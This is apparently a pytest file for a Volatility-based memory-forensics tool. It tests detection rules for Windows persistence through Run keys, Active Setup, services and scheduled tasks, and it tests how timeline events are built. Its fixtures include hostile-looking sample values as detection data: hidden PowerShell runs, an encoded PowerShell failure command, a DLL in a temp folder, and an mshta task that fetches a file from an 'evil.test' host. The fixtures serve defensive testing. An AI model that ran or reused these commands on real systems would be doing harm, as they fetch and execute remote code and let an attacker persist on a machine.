"""Services / Active Setup / scheduled-task rules, renamed-plugin fallback, timeline events from more plugins."""
import json

from test_case_and_ioc import by_rule, run_with, with_plugins
from test_roadmap_features import plugin

STAMP = "2018-06-21T01:00:00+00:00"
SVC = "ControlSet001\\Services\\"


def reg(key, **values):
    return [{"Type": "REG_SZ", "Key": key, "Name": name, "Data": data, "Last Write Time": STAMP} for name, data in values.items()]


# ============================================================================= registry entries
def test_new_choices_run_the_expected_printkey_commands(tmp_path):
    rows = reg("Microsoft\\Active Setup\\Installed Components\\{A}", StubPath="C:\\Users\\Public\\x.exe")
    result, _ = run_with(tmp_path, {"windows.registry.printkey": rows}, optional_plugins=["more_run_keys", "service_keys"])
    runs = {p.name: p for p in result.plugins if p.name.startswith("windows.registry.printkey [")}
    assert len(runs) == 6 and all(p.status == "Completed" for p in runs.values())
    keys = {name: p.command[p.command.index("--key") + 1] for name, p in runs.items()}
    assert keys["windows.registry.printkey [Run, 32-bit]"] == "Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
    assert keys["windows.registry.printkey [Explorer Run, user]"].startswith("Software\\") and keys["windows.registry.printkey [Explorer Run, user]"].endswith("Policies\\Explorer\\Run")
    assert "--recurse" in runs["windows.registry.printkey [Active Setup]"].command
    assert runs["windows.registry.printkey [Services]"].command[-3:] == ["--key", "ControlSet001\\Services", "--recurse"]
    assert any(f.rule_id == "PER-001" and "'StubPath'" in f.title for f in result.indications)         # Active Setup entry from Public


def test_run_key_rule_understands_environment_variables_and_quoted_paths():
    key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    rows = (reg(key, Temp="%TEMP%\\up.exe /s", Public="\"%PUBLIC%\\Libraries\\a b.exe\" -x", Fine="\"C:\\Program Files\\Vendor App\\app.exe\" /min",
                Shell="powershell.exe -nop -c start", Plain="C:\\Windows\\System32\\SecurityHealthSystray.exe"))
    found = by_rule(with_plugins(plugin("windows.registry.printkey [Run, user]", rows)), "PER-001")
    titles = " | ".join(f.title for f in found)
    assert len(found) == 3, titles
    assert {f.severity for f in found if "'Temp'" in f.title or "'Public'" in f.title} == {"Medium"}
    assert next(f for f in found if "'Shell'" in f.title).severity == "Low"


def test_active_setup_only_reads_stubpath_and_ignores_routine_rundll32():
    key = "Microsoft\\Active Setup\\Installed Components\\"
    rows = (reg(key + "{A}", StubPath="rundll32.exe C:\\Windows\\System32\\mscories.dll,Install", Version="1,0,0,0") +
            reg(key + "{B}", StubPath="regsvr32.exe /s /n /i:/UserInstall C:\\Windows\\system32\\themeui.dll") +
            reg(key + "{C}", StubPath="C:\\Users\\Public\\Libraries\\setup.exe", ComponentID="C:\\Users\\Public\\ignored.exe") +
            reg(key + "{D}", StubPath="powershell.exe -w hidden -c x"))
    found = by_rule(with_plugins(plugin("windows.registry.printkey [Active Setup]", rows)), "PER-001")
    assert sorted(f.severity for f in found) == ["Low", "Medium"], [f.title for f in found]
    assert not any("ignored.exe" in " ".join(f.evidence) for f in found)


# ============================================================================= PER-003 services
def service_rows():
    return (reg(SVC + "Evil", ImagePath="\\??\\C:\\Users\\Public\\evil.sys", Start="3", Type="1") +
            reg(SVC + "Dllsvc", ImagePath="%SystemRoot%\\system32\\svchost.exe -k netsvcs", Start="2", Type="32") +
            reg(SVC + "Dllsvc\\Parameters", ServiceDll="%TEMP%\\payload.dll") +
            reg(SVC + "Dormant", ImagePath="C:\\Users\\Public\\old.exe", Start="4", Type="16") +
            reg(SVC + "Shell", ImagePath="cmd.exe /c C:\\Windows\\System32\\x.bat", Start="2", Type="16") +
            reg(SVC + "Good", ImagePath="\"C:\\Program Files\\Vendor\\svc.exe\" -service", Start="2", Type="16") +
            reg(SVC + "Driver", ImagePath="\\SystemRoot\\System32\\drivers\\disk.sys", Start="0", Type="1") +
            reg(SVC + "Relative", ImagePath="System32\\drivers\\mup.sys", Start="1", Type="2") +
            [{"Type": "Key", "Key": "ControlSet001\\Services", "Name": "Evil", "Data": "", "Last Write Time": STAMP}])


def test_service_key_rule_flags_risky_images_and_dlls_but_not_system_services():
    found = by_rule(with_plugins(plugin("windows.registry.printkey [Services]", service_rows())), "PER-003")
    by_name = {f.title.split("'")[1]: f for f in found}
    assert set(by_name) == {"Evil", "Dllsvc", "Dormant", "Shell"}, [f.title for f in found]
    assert by_name["Evil"].severity == "Medium" and "temporary/user-writable" in by_name["Evil"].title
    assert by_name["Dllsvc"].severity == "Medium" and any("ServiceDll" in r for r in by_name["Dllsvc"].reasons)
    assert by_name["Dormant"].severity == "Low" and any("disabled" in r for r in by_name["Dormant"].reasons)    # Start = 4
    assert by_name["Shell"].severity == "Low"
    item = by_name["Evil"].evidence_items[0]
    assert item.source_plugin == "windows.registry.printkey [Services]" and item.field == "ImagePath" and item.row_index == 0


def test_service_key_rule_is_silent_without_its_plugin_and_flags_encoded_failure_commands():
    assert by_rule(with_plugins(), "PER-003") == []
    rows = reg(SVC + "Odd", ImagePath="C:\\Windows\\system32\\svchost.exe -k x", FailureCommand="powershell -enc " + "QQBBAEEAQQBBAEEAQQBB" * 3, Start="2")
    found = by_rule(with_plugins(plugin("windows.registry.printkey [Services]", rows)), "PER-003")
    assert len(found) == 1 and found[0].severity == "Medium" and "FailureCommand" in found[0].reasons[0]


# ============================================================================= PER-004 scheduled tasks
def task(name, action, args="", **extra):
    row = {"Task Name": name, "Action Type": "Exe", "Action": action, "Action Arguments": args, "Enabled": True,
           "Creation Time": "2018-06-20T10:00:00+00:00", "Last Run Time": STAMP, "Trigger Type": "Daily", "Trigger Description": "", "Key Name": "{G}"}
    row.update(extra)
    return row


def test_scheduled_task_rule_flags_risky_actions_and_hiding_options_only():
    rows = [task("\\Updater", "C:\\Users\\Public\\upd.exe"),
            task("\\Env", "%TEMP%\\run.exe"),
            task("\\Hidden", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-nop -w hidden -c Get-Date"),
            task("\\Download", "C:\\Windows\\System32\\mshta.exe", "http://evil.test/a.hta"),
            task("\\Off", "C:\\Users\\Public\\old.exe", Enabled=False),
            task("\\Microsoft\\Windows\\Defrag\\ScheduledDefrag", "%windir%\\system32\\defrag.exe", "-c -h -o -$"),
            task("\\Cmd", "C:\\Windows\\System32\\cmd.exe", "/c echo hi"),
            task("\\Com", "{1234-1234}", "", **{"Action Type": "ComHandler"}),
            task("\\Updater", "C:\\Users\\Public\\upd.exe")]                          # duplicate
    found = by_rule(with_plugins(plugin("windows.registry.scheduled_tasks", rows)), "PER-004")
    names = sorted(f.title.split("'")[1] for f in found)
    assert names == ["\\Download", "\\Env", "\\Hidden", "\\Off", "\\Updater"], names
    assert next(f for f in found if "'\\Off'" in f.title).severity == "Low"
    assert all(f.severity == "Medium" for f in found if "'\\Off'" not in f.title)
    assert found[0].evidence_items[0].source_plugin == "windows.registry.scheduled_tasks" and found[0].evidence_items[0].type == "scheduled_task"
    assert by_rule(with_plugins(), "PER-004") == []


def test_scheduled_task_plugin_is_found_under_its_older_name(tmp_path):
    """Volatility 2.11 only lists windows.scheduled_tasks; the result keeps the stable name windows.registry.scheduled_tasks."""
    from test_volatility_compat import ALL_PLUGINS
    rows = [task("\\Updater", "C:\\Users\\Public\\upd.exe")]
    old, _ = run_with(tmp_path, {"windows.scheduled_tasks": rows}, optional_plugins=["windows.registry.scheduled_tasks"],
                      env={"FAKE_VOL_PLUGINS": ALL_PLUGINS + ",windows.scheduled_tasks", "FAKE_VOL_VERSION": "2.11.0"})
    ran = next(p for p in old.plugins if p.name == "windows.registry.scheduled_tasks")
    assert ran.status == "Completed" and "windows.scheduled_tasks" in ran.command and "windows.registry.scheduled_tasks" not in ran.command
    assert any(f.rule_id == "PER-004" for f in old.indications)
    new, _ = run_with(tmp_path, {"windows.registry.scheduled_tasks": rows}, optional_plugins=["windows.registry.scheduled_tasks"],
                      env={"FAKE_VOL_PLUGINS": ALL_PLUGINS + ",windows.registry.scheduled_tasks,windows.scheduled_tasks"})
    assert "windows.registry.scheduled_tasks" in next(p for p in new.plugins if p.name == "windows.registry.scheduled_tasks").command
    none, _ = run_with(tmp_path, {}, optional_plugins=["windows.registry.scheduled_tasks"], env={"FAKE_VOL_PLUGINS": ALL_PLUGINS})
    gone = next(p for p in none.plugins if p.name == "windows.registry.scheduled_tasks")
    assert gone.status == "Failed" and "not available" in gone.error


def test_compatibility_report_accepts_either_name_of_a_renamed_plugin():
    from app.analysis.volatility_runner import VolatilityTool, compatibility_report
    tool = VolatilityTool(["vol"], "2.11.0", "test", frozenset({"windows.scheduled_tasks", "windows.a"}))
    report = compatibility_report(tool, ["windows.registry.scheduled_tasks|windows.scheduled_tasks", "windows.registry.amcache|windows.amcache"])
    assert "windows.registry.amcache" in report and "windows.registry.scheduled_tasks" not in report


# ============================================================================= timeline
def events_of(result, category=None):
    return [e for e in result.timeline if category is None or e.category == category]


def rebuilt(result):
    from app.engines.windows.analysis.timeline_builder import build_timeline
    result.timeline = build_timeline(result)
    return result


def test_timeline_gets_registry_task_and_execution_events_with_provenance():
    runkey = reg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", Updater="C:\\Users\\Public\\u.exe")
    services = service_rows()
    tasks = [task("\\Updater", "C:\\Users\\Public\\upd.exe"), task("\\Sys", "C:\\Windows\\System32\\defrag.exe")]
    userassist = [{"Name": "C:\\Users\\bob\\Downloads\\a.exe", "Count": 2, "Last Updated": STAMP}, {"Name": "UEME_CTLSESSION", "Last Updated": STAMP}]
    amcache = [{"Path": "c:\\users\\bob\\downloads\\b.exe", "InstallTime": "2018-06-19T00:00:00+00:00", "LastModifyTime": STAMP},
               {"Path": "c:\\windows\\system32\\cmd.exe", "InstallTime": STAMP}]
    shim = [{"File Path": "C:\\Users\\Public\\c.exe", "Last Modified": "2018-06-18T00:00:00+00:00", "Last Update": STAMP},
            {"File Path": "C:\\Windows\\explorer.exe", "Last Modified": STAMP}]
    result = rebuilt(with_plugins(
        plugin("windows.registry.printkey [Run, user]", runkey), plugin("windows.registry.printkey [Services]", services),
        plugin("windows.registry.scheduled_tasks", tasks), plugin("windows.registry.userassist", userassist),
        plugin("windows.registry.amcache", amcache), plugin("windows.shimcachemem", shim)))
    registry = events_of(result, "Registry")
    keys = " | ".join(e.description for e in registry)
    assert any("Run" in e.description and "Updater" in e.description for e in registry)
    assert "Evil" in keys and "Dllsvc" in keys and "Good" not in keys and "Driver" not in keys and "Relative" not in keys      # system services left out
    assert all(e.provenance["timestamp"]["plugin"].startswith("windows.registry.printkey [") for e in registry)
    tasks_ev = events_of(result, "Scheduled task")
    assert sorted(e.event_type for e in tasks_ev) == ["Scheduled task created", "Scheduled task last ran"] and "Updater" in tasks_ev[0].description
    execution = events_of(result, "Execution")
    descriptions = " | ".join(e.description for e in execution)
    assert "a.exe" in descriptions and "UEME" not in descriptions and "b.exe" in descriptions and "c.exe" in descriptions
    assert "cmd.exe" not in descriptions and "explorer.exe" not in descriptions
    assert {e.event_type for e in execution} == {"Program run (UserAssist)", "Program installed (Amcache)", "Amcache entry modified", "Shimcache entry updated"}
    assert {e.event_type for e in events_of(result, "File time")} == {"File last modified (shimcache)"}       # file dates are not activity: own category, off by default
    assert [e.timestamp for e in result.timeline] == sorted((e.timestamp for e in result.timeline), key=lambda t: __import__("app.util", fromlist=["x"]).time_key(t))


def test_timeline_covered_plugins_are_not_added_a_second_time_by_the_generic_path():
    rows = [{"Name": "C:\\Users\\bob\\Downloads\\a.exe", "Count": 2, "Last Updated": STAMP}]
    result = rebuilt(with_plugins(plugin("windows.registry.userassist", rows)))
    assert len([e for e in result.timeline if "a.exe" in e.description]) == 1
    assert not any(e.category.startswith("Registry.") for e in result.timeline)


def test_timeline_event_cap_adds_a_warning():
    from app.engines.windows.analysis import timeline_sources
    rows = [{"Path": f"c:\\users\\bob\\downloads\\f{i}.exe", "InstallTime": f"2018-06-{1 + i % 20:02d}T00:00:00+00:00"} for i in range(timeline_sources.MAX_EVENTS_PER_PLUGIN + 50)]
    result = rebuilt(with_plugins(plugin("windows.registry.amcache", rows)))
    assert len(events_of(result, "Execution")) == timeline_sources.MAX_EVENTS_PER_PLUGIN
    assert any("only the first" in w and "windows.registry.amcache" in w for w in result.warnings)
    rebuilt(result)
    assert sum("only the first" in w for w in result.warnings) == 1                 # not repeated on every rebuild


def test_attack_tags_and_rule_catalog_know_the_new_rules():
    from app.engines.windows.indicators.attack import attack_for
    from app.engines.windows.indicators.engine import DEFAULT_RULES, rule_name
    assert [t.id for t in attack_for("PER-003")] == ["T1543.003"] and [t.id for t in attack_for("PER-004")] == ["T1053.005"]
    assert "T1547.014" in [t.id for t in attack_for("PER-001")]
    assert rule_name("PER-003") != "PER-003" and rule_name("PER-004") != "PER-004"
    assert len(DEFAULT_RULES) == 43
